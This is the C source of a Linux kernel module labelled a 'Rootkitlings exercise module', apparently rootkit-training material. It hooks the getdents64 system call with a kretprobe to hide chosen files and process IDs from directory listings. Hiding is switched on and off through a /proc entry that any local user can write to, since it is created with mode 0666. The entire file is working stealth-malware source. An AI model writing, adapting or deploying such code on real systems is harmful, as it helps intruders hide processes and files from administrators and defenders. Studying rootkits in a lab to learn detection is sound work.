// SPDX-License-Identifier: GPL-2.0
#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 0
#error "unknown ROOTKITLINGS_FAIL_POINT"
#endif

#include <linux/align.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/limits.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "target_list.h"

#define RK_BUF_MAX 2048
#define RK_CMD_MAX 128
#define RK_DIRENT_NAME_OFF offsetof(struct linux_dirent64, d_name)

static struct rk_target_list file_targets;
static struct rk_target_list pid_targets;
static struct proc_dir_entry *proc_entry;

struct rk_getdents_data {
	void __user *dirp;
	unsigned char scratch[RK_BUF_MAX];
};

static unsigned short rk_reclen(const unsigned char *rec)
{
	unsigned short len;

	memcpy(&len, rec + offsetof(struct linux_dirent64, d_reclen),
	       sizeof(len));
	return len;
}

static bool rk_dirent_should_hide(const char *name, size_t name_length)
{
	unsigned int pid_val;

	if (rk_target_prefix_match(&file_targets, name, name_length))
		return true;
	if (kstrtouint(name, 10, &pid_val) == 0 &&
	    rk_target_number_match(&pid_targets, pid_val))
		return true;
	return false;
}

static size_t rk_filter_dirents(unsigned char *buf, size_t length)
{
	size_t offset = 0;
	size_t write_off = 0;
	size_t prev_retained = SIZE_MAX;

	while (offset < length) {
		unsigned char *rec = buf + offset;
		unsigned short rec_len = rk_reclen(rec);
		const char *name;
		size_t name_len;

		if (rec_len == 0 || rec_len > length - offset)
			break;
		name = (const char *)rec + RK_DIRENT_NAME_OFF;
		name_len = strnlen(name, rec_len - RK_DIRENT_NAME_OFF);
		if (rk_dirent_should_hide(name, name_len)) {
			if (prev_retained != SIZE_MAX)
				memcpy(buf + prev_retained +
				       offsetof(struct linux_dirent64, d_off),
				       rec + offsetof(struct linux_dirent64, d_off),
				       sizeof(((struct linux_dirent64 *)0)->d_off));
		} else {
			if (write_off != offset)
				memmove(buf + write_off, rec, rec_len);
			prev_retained = write_off;
			write_off += rec_len;
		}
		offset += rec_len;
	}
	return write_off;
}

static int rk_getdents_entry(struct kretprobe_instance *inst,
			     struct pt_regs *regs)
{
	struct rk_getdents_data *data = (void *)inst->data;
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs) {
		data->dirp = NULL;
		return 0;
	}
	data->dirp = (void __user *)uregs->si;
	return 0;
}

static int rk_getdents_return(struct kretprobe_instance *inst,
			      struct pt_regs *regs)
{
	struct rk_getdents_data *data = (void *)inst->data;
	long result = (long)regs_return_value(regs);
	size_t new_len;

	if (!data->dirp || result <= 0 || result > RK_BUF_MAX)
		return 0;
	if (copy_from_user_nofault(data->scratch, data->dirp, result) != 0)
		return 0;

	new_len = rk_filter_dirents(data->scratch, (size_t)result);
	if (new_len == (size_t)result)
		return 0;
	if (new_len == 0) {
		regs_set_return_value(regs, 0);
		return 0;
	}
	if (copy_to_user_nofault(data->dirp, data->scratch, new_len) != 0)
		return 0;
	regs_set_return_value(regs, (unsigned long)new_len);
	return 0;
}

static struct kretprobe getdents_probe = {
	.kp.symbol_name = "__x64_sys_getdents64",
	.entry_handler = rk_getdents_entry,
	.handler = rk_getdents_return,
	.data_size = sizeof(struct rk_getdents_data),
	.maxactive = 16,
};

static int rk_show(struct seq_file *out, void *unused)
{
	unsigned long flags;
	unsigned int i;

	seq_puts(out, "file_targets:\n");
	spin_lock_irqsave(&file_targets.lock, flags);
	for (i = 0; i < file_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, file_targets.entries[i]);
	spin_unlock_irqrestore(&file_targets.lock, flags);

	seq_puts(out, "pid_targets:\n");
	spin_lock_irqsave(&pid_targets.lock, flags);
	for (i = 0; i < pid_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, pid_targets.entries[i]);
	spin_unlock_irqrestore(&pid_targets.lock, flags);
	return 0;
}

static int rk_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_show, NULL);
}

static ssize_t rk_write(struct file *file, const char __user *ubuf,
			 size_t count, loff_t *off)
{
	char buf[RK_CMD_MAX];
	size_t len;
	unsigned int idx;

	if (*off != 0)
		return -EINVAL;
	if (count >= sizeof(buf))
		return -E2BIG;
	if (copy_from_user(buf, ubuf, count))
		return -EFAULT;
	buf[count] = '\0';
	len = count;
	if (len > 0 && buf[len - 1] == '\n')
		buf[--len] = '\0';

	if (strncmp(buf, "hide file ", 10) == 0) {
		int rc = rk_target_add(&file_targets, buf + 10);
		return rc < 0 ? rc : (ssize_t)count;
	}
	if (strncmp(buf, "hide pid ", 9) == 0) {
		int rc = rk_target_add(&pid_targets, buf + 9);
		return rc < 0 ? rc : (ssize_t)count;
	}
	if (strncmp(buf, "unhide file ", 12) == 0) {
		if (kstrtouint(buf + 12, 10, &idx) != 0)
			return -EINVAL;
		return rk_target_remove(&file_targets, idx, NULL, 0) ?:
		       (ssize_t)count;
	}
	if (strncmp(buf, "unhide pid ", 11) == 0) {
		if (kstrtouint(buf + 11, 10, &idx) != 0)
			return -EINVAL;
		return rk_target_remove(&pid_targets, idx, NULL, 0) ?:
		       (ssize_t)count;
	}
	return -EINVAL;
}

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_open,
	.proc_read = seq_read,
	.proc_write = rk_write,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

static int __init rk_init(void)
{
	int error;

	rk_target_list_init(&file_targets);
	rk_target_list_init(&pid_targets);

	error = register_kretprobe(&getdents_probe);
	if (error)
		return error;

	proc_entry = proc_create("rootkitlings", 0666, NULL, &rk_proc_ops);
	if (!proc_entry) {
		unregister_kretprobe(&getdents_probe);
		return -ENOMEM;
	}
	return 0;
}

static void __exit rk_exit(void)
{
	proc_remove(proc_entry);
	unregister_kretprobe(&getdents_probe);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings exercise module");
